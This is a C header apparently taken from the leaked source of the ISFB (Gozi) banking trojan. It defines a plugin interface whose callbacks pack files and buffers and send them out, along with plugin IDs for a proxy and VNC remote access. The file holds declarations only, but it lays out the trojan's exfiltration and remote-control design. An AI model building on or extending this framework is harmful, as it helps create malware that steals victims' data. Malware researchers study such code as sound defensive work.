//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.11
//	
// module: plugin.h
// $Revision: 375 $
// $Date: 2014-10-17 21:17:34 +0400 (Пт, 17 окт 2014) $
// description:
//	Plugin DLL support engine.

#pragma once

// Current ISFB plugin engine version.
// A plugin DLL has to make sure it's version is lower or equal to the value specified within
//	PLUGIN_CALLBACKS.Version before using any callback function.
#define	ISFB_PLUGIN_VERSION	0x20b00


typedef WINERROR (__stdcall* ISFB_PACK_AND_SEND_FILE)(PVOID Context, LPSTR	FilePath, ULONG SendId);
typedef	WINERROR (__stdcall* ISFB_PACK_AND_SEND_BUFFER)(PVOID Context, PCHAR Buffer, ULONG Size, ULONG SendId);
typedef WINERROR (__stdcall* ISFB_PLUGIN_NOTIFY)(USHORT Id, USHORT Action, WINERROR Status);


//
//	Plugin callbacks descriptor structure that's being passed as a parameter to PluginRegisterCallbacks function.
//  A pointer to this structure is being saved within a plugin DLL, so it has to be avaliable during all time the application runs.
//	A plugin DLL is not aloved to change any field from this structure.
//
typedef struct _PLUGIN_CALLBACKS
{
	// Current plugin engine version, should be equal to ISFB_PLUGIN_VERSION value
	ULONG						Version;

	// Number of workers currently running. 
	// Since plugins can create their threads this value is used for synchronization to avoid unloading app while plugins are active
	LONG volatile				WorkerCount;		

	// Application shutdown event handle. Used to notify plugin about the app shutdown.
	HANDLE						hAppShutdownEvent;

	// Table of callback functions a plugin DLL can use.
	ISFB_PACK_AND_SEND_FILE		PackAndSendFile;
	ISFB_PACK_AND_SEND_BUFFER	PackAndSendBuffer;
	ISFB_PLUGIN_NOTIFY			PluginNotify;
} PLUGIN_CALLBACKS, *PPLUGIN_CALLBACKS;


// PluginRegisterCallbacks function prototype
typedef VOID (__stdcall* PLUGIN_REGISTER_CALLBACKS)(PPLUGIN_CALLBACKS pCallbacks, PVOID Context);


//
//	Plugin notification structure. 
//	Being sent every time it's needed to notify the host about a plugin state.
//
typedef struct _PLUGIN_NOTIFICATION
{
	// Plugin ID
	USHORT	Id;
	// An action performed by the plugin
	USHORT	Action;
	// The action complete status
	ULONG	Status;
} PLUGIN_NOTIFICATION, *PPLUGIN_NOTIFICATION;


// Plugin IDs
#define	PLG_ID_PROXY		1
#define	PLG_ID_VNC			2


// Plugin action codes
#define	PLG_ACTION_START	1
#define	PLG_ACTION_STOP		2


// Plugin callbacks pointer, defined within plugin.c
extern PPLUGIN_CALLBACKS	g_pPluginCallbacks;


// Since a plugin DLL can create it's own threads the application has to make sure all of them are terminated before exiting.
// This function waits for plugin workers (threads) to terminate.
_inline VOID WaitForPlugins(
	PPLUGIN_CALLBACKS	pCallbacks,
	LONG				Timeout	// milliseconds
	)
{
	do
	{
		SleepEx(100, TRUE);
	} while ((pCallbacks->WorkerCount) && ((Timeout -= 100) > 0));
}


//
//	Immediately sends plugin notification with the specified parameters.
//
WINERROR PlgNotify(
	USHORT		Id,
	USHORT		Action,
	WINERROR	Status
	);
